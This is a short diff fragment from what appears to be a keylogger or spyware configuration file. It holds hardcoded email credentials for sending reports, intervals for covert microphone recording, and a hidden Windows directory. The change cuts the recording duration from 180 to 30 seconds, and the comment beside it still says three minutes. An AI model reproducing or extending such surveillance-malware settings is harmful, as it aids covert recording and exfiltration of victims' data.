@@ -31,7 +31,7 @@ EMAIL_ADDRESS = "071bfafc4dde91"
 EMAIL_PASSWORD = "9918ecc6a25877"
 SEND_REPORT_EVERY = 90  # as in seconds
 MICROPHONE_INTERVAL = 4500  # 1 hour and 15 minutes in seconds
-MICROPHONE_DURATION = 180  # 3 minutes in seconds
+MICROPHONE_DURATION = 30  # 3 minutes in seconds
 MAX_ATTACHMENT_SIZE = 7 * 1024 * 1024  # 7 MB
 KLM_DIRECTORY = "C:\\Windows\\klm"
 
